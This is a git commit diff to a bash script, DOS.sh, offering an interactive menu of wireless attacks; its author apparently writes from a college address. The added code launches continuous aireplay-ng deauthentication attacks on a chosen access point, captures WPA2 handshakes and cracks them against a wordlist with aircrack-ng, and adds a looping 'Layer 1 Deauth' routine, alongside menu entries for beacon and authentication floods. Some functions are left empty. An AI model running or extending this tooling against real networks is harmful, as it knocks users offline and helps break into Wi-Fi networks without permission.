eac08fc786fea98f80e17cb079a22b4886297d0b
TDonk994 <tgarvey@flemingcollege.ca>
2024-11-22 17:04:23 -0500

    Update DOS.sh

--- DOS.sh
+++ DOS.sh
@@ -111,6 +111,12 @@ Clears_CSV() {
     else
         echo "no  more bssid2.csv"
     fi
+    if [ -e "bssid3.csv" ]; then
+        sudo rm bssid3.csv
+        echo "removed bssid3.csv"
+    else
+        echo "no more bssid3.csv"
+    fi
     echo "all files deleted or non existent"
     sleep 1
 }
@@ -128,15 +134,34 @@ For_aireplay () {
     cat bssid1.csv | awk '{print $6}' > bssid.csv   
     cat bssid1.csv | awk '{print $10}' > bssid.csv
     cat bssid.csv | awk '{print}'
-    read -p "which AP?: " AP
+    read -p "which AP(use the name)?: " AP
     echo "you chose $AP"
     cat bssid.csv | grep $AP > bssid2.csv
-    usedbssid=$(cat bssid2.csv | awk '{print $1}')
-    channelused=$(cat bssid2.csv | awk '{print $2}')
-    echo "changing channel to $channelused"
-    sudo iwconfig wlan0 channel $channelused
-    echo "starting aireplay-ng deauth attack"
-    sudo aireplay-ng -0 0 -a $usedbssid wlan0
+    numberofbssid=$(cat bssid2.csv | wc -l)
+    if [ $numberofbssid == 1 ]; then
+        usedbssid=$(cat bssid2.csv | awk '{print $1}')
+        channelused=$(cat bssid2.csv | awk '{print $2}')
+        echo "changing channel to $channelused"
+        sudo iwconfig wlan0 channel $channelused
+        echo "starting aireplay-ng deauth attack"
+        echo "cancel the attack with ctrl c"
+        sudo aireplay-ng -0 0 -a $usedbssid wlan0
+    else
+        echo "more than one AP with that name, please use the MAC address"
+        cat bssid2.csv | awk '{print}'
+        read -p "Enter the AP's MAC address: " MAC
+        echo "you chose $MAC"
+        cat bssid2.csv | grep $MAC > bssid3.csv
+        usedbssid=$(cat bssid3.csv | awk '{print $1}')
+        channelused=$(cat bssid3.csv | awk '{print $2}')
+        echo "changing channel to $channelused"
+        sudo iwconfig wlan0 channel $channelused
+        echo "starting aireplay-ng deauth attack"
+        sleep 1
+        echo "cancel the attack with ctrl c"
+        sudo aireplay-ng -0 0 -a $usedbssid wlan0
+    fi
+    
 }
 
 
@@ -179,31 +204,7 @@ For_mdk4 () {
 For_Analysis () {
     echo "you chose nearby AP analysis"
     echo "removing existing csv files"
-    if [ -e "wlan0-01.csv" ]; then
-        sudo rm wlan0-01.csv
-        echo "removed wlan0-01.csv"
-    else
-        echo "no more wlan0-01.csv"
-    fi
-    if [ -e "bssid.csv" ]; then
-        sudo rm bssid.csv
-        echo "removed bssid.csv"
-    else
-        echo "no more bssid.csv"
-    fi
-    if [ -e "bssid1.csv" ]; then
-        sudo rm bssid1.csv
-        echo "removed bssid1.csv"
-    else
-        echo "no more bssid1.csv"
-    fi
-    if [ -e "bssid2.csv" ]; then
-        sudo rm bssid2.csv
-        echo "removed bssid2.csv"
-    else
-        echo "no  more bssid2.csv"
-    fi
-    echo "all files deleted or non existent"
+    Clears_CSV
     sleep 1
     echo "starting airodump-ng to find APs, this will take 30 seconds"
     sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
@@ -275,14 +276,103 @@ For_Auth_Flood () {
 
 For_WPA2_Crack () {
     echo "you chose WPA2 Crack"
-    
+    Clears_CSV
+    echo "starting airodump-ng to find APs, this will take 30 seconds"
+    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
+    sleep 32
+    cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
+    cat bssid1.csv | awk '{print $1}' > bssid.csv
+    cat bssid1.csv | awk '{print $6}' > bssid.csv
+    cat bssid1.csv | awk '{print $10}' > bssid.csv
+    cat bssid.csv | awk '{print}'
+    read -p "which AP (use the name)?: " AP
+    echo "you chose $AP"
+    cat bssid.csv | grep $AP > bssid2.csv
+    usedbssid=$(cat bssid2.csv | awk '{print $1}')
+    channelused=$(cat bssid2.csv | awk '{print $2}')
+    while true; do
+        read -p "would you like to wait for a handshake or deauth the clients? 1)handshake, 2)deauth, 3)Exit : " choice
+        if [ $choice == 1 ]; then
+            EAPOL_Capture $channelused $usedbssid
+        elif [ $choice == 2 ]; then
+            EAPOL_Capture_Deauth $channelused $usedbssid
+        elif [ $choice == 3 ]; then
+            echo "exiting"
+            exit 1
+        else
+            echo "invalid input11"
+            continue
+        fi
+    done
 }
 
+EAPOL_Capture () {
+    CHANNEL=$1
+    BSSID=$2
+    echo "capturing EAPOL handshake"
+    if [ -e "thehandshake.pcap" ]; then
+        sudo rm thehandshake.pcap
+        echo "removed thehandshake.pcap"
+    else
+        echo "no more thehandshake.pcap"
+    fi
+    sudo airodump-ng -c $CHANNEL -d $BSSID -w thehandshake.pcap wlan0
+    echo "handshake captured"
+    echo "cracking the handshake"
+    sudo aircrack-ng -w passwdfile.dic -b $BSSID thehandshake.pcap
+}
+
+EAPOL_Capture_Deauth () {
+    CHANNEL=$1
+    BSSID=$2
+    echo "capturing EAPOL handshake and deauthenticating clients"
+
+}
 For_Layer1_Deauth () {
     echo "you chose Layer 1 Deauth"
-    
+    read -p "Enter interface (monitor mode) you wish to use for the attack: " interface
+    while true; do
+        read -p "frequencey band(1) or channel(2) or exit(anything else) you wish to use: " OP
+        if [ $OP == 1 ]; then
+            read -p "Enter frequencey band you wish to use (2.4 or 5): " band
+            if [ $band == 2.4 ]; then
+                band_op="2.4G"
+            elif [ $band == 5 ]; then
+                band_op="5G"
+            else
+                echo "exitting"
+                exit 1
+            fi
+        elif [ $OP == 2 ]; then
+            read -p "Enter channel you wish to use: " channel
+        else
+            echo "invalid input"
+            continue
+        fi
+        iwconfig $interface channel $channel
+        read -p "would you like to continue? (y/n): " continue
+        if [ $continue == "n" ]; then
+            echo "exiting"
+            exit 1
+        else
+            echo "continuing"
+            for count in $(seq 1 2000)
+            do
+                if [ $OP == 2 ]; then
+                    echo "to cancel the attack, press ctrl c"
+                    (iwconfig $interface b -c $channel > /dev/null)&
+                elif [ $OP == 1 ]; then
+                    echo "to cancel the attack, press ctrl c"
+                    (iwconfig $interface b -b $band_op > /dev/null)&
+                else
+                    echo "invalid input22 exiting"
+                    exit 1
+                fi
+            done
+        fi
+    done
 }
-
+whitelist=$1
 while true; do
     echo -e "Which do you want to use?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Nearby AP analysis\n5) Auth Flood\n6) Layer 1 Deauth\n7) WPA2 Crack\n8) Exit"
     sleep 1
@@ -306,6 +396,7 @@ while true; do
         exit 1
     else
         echo "invalid input, try again"
+        continue
     fi
 done
 
